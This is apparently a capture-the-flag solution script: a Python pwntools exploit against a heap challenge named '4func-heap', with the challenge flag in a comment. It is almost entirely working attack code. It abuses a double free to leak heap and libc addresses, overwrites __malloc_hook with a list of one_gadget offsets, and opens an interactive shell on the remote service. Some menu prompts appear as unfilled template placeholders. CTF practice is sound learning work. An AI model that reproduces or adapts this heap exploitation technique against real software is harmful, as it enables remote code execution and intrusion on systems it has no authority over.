#exploit for 4func-heap
#flag=flag{g3n3ric_f1ag_1n_1e3t_sp3ak}
from pwn import *
gadgets=[0x4f322,0x10a38c,0x10a398,0xe569f,0xe5863,0xe5858,0x4f2c5,0xe585f]                                                                        
for gadget in gadgets:
	target=remote('2020.redpwnc.tf',31774)
	libc=ELF('/media/sf_kalishared/livectfs/sharkyctf2020/pwn2/libc-2.27.so')

	def init(option,index):
		print(target.recvuntil("{{prompts.menu}}: "))
		target.sendline(str(option))
		print(target.recvuntil("}}: "))
		target.sendline(str(index))	

	def malloc(size,data):
		init(1,0)
		print(target.recvuntil("}}: "))
		target.sendline(str(size))	
		print(target.recvuntil("}}: "))
		target.send(data)	

	def view():
		init(3,0)
		leak=target.recvline().strip("\n")
		print(leak)
		print(target.recvline())
		return leak

	def free():
		init(2,0)
		print(target.recvline())

	malloc(0x20,"A\n")	
	free()
	free()
	heap_leak=u64(view().ljust(8,"\x00"))
	malloc(0x500,p64(heap_leak-0x200))
	malloc(0x30,p64(heap_leak+0xa))
	malloc(0x20,p64(heap_leak+0x30))
	malloc(0x20,p64(heap_leak+0xa))
	malloc(0x20,p64(heap_leak+0xa))
	free()
	libc_leak=u64(view().ljust(8,"\x00"))
	libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x70
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	malloc(0x20,p64(libc_malloc_hook))
	malloc(0x30,p64(libc_gadget))
	init(1,0)
	target.sendline("1")
	target.interactive()


	
	
	
